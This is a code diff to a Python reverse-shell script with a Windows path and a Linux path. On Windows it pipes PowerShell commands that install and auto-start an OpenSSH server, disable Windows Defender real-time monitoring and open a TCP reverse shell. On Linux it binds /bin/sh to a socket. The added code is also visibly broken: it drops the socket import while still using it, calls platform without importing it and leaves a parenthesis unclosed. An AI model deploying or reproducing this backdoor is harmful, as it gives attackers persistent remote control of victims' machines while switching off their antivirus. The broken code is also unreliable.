@@ -1,12 +1,14 @@
 import os
 import subprocess
 import sys
-import socket
+os.system("pip install psutil")
+import psutil
+import struct
 
 class Details:
     def __init__(self):
         self.os = os.name
-        self.ip = "0.0.0.0"
+        self.start_Ip = "127.0.0.1"
         self.port = 9191
 
     
@@ -14,6 +16,8 @@ class Details:
     def windows(self):
         """Function is only work if the host has a Windows Operating system It will create a Reverse Shell"""
 
+        
+        os.system("pip install psutil")
         ps_process = subprocess.Popen(["powershell", "-NoProfile", "-NoExit", "-Command", "-"],
                                       stdin=subprocess.PIPE,
                                       stdout=subprocess.PIPE,
@@ -21,7 +25,12 @@ class Details:
                                       text=True)
         ##### THE COMMANDS
         command = [
-            "$ip = '192.168.16.72'",  ###########CHANGE THE IP AS PER
+            "Get-WindowsFeature -Name OpenSSH-Server",  ######SETUP A SSH SERVER START
+            "Add-WindowsFeature -Name OpenSSH-Server",
+            "Start-Service sshd",
+            "Set-Service -Name sshd -StartupType 'Automatic'",####SSH END
+            "Set-MpPreference -DisableRealtimeMonitoring $true",  ##Disabling the Windows Defender
+            "$ip = '127.0.0.1'",  ###########CHANGE THE IP 
             "$port = 9191",         #############CHANGE THE PORT
             "$tcpClient = New-Object System.Net.Sockets.TcpClient",
             "$tcpClient.Connect($ip, $port)",
@@ -49,6 +58,7 @@ class Details:
 
     #######LINUX###############
     def linux(self):
+        os.system("pip install psutil")
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.connect((self.ip,self.port))
         os.dup2(s.fileno(),0)
@@ -57,7 +67,19 @@ class Details:
         subprocess.call(["/bin/sh","-i"])
         
     
-    
+    def get_default_gateway(self):  #### Gateway
+        """This function will identify the Default Gateway of the Device """
+        if platform.system() == "Windows":
+            for interface, stats in psutil.net_if_stats().items():
+                if "defaultgateway" in stats:
+                    return stats["defaultgateway"]
+        elif platform.system() == "Linux":
+            with open("/proc/net/route") as route_file:
+                for line in route_file.readlines():
+                    fields = line.strip().split()
+                    if fields[1] == "00000000":
+                        return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16))
+        return None
 
     ## TO IDENTIFY THE HOST OS
     def os_define(self):
